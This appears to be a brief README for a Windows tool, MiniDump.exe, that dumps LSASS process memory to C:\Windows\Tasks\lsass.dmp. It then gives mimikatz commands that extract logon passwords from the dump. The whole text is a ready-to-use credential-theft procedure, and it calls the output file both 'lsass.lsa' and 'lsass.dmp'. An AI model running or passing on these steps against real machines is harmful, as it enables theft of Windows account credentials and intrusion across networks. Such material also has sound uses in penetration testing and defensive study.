# MiniDump
Usage:
```
MiniDump.exe
```
The lsass.lsa file will be saved to "C:\Windows\Tasks\lsass.dmp" and can be decrypted using:
```
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
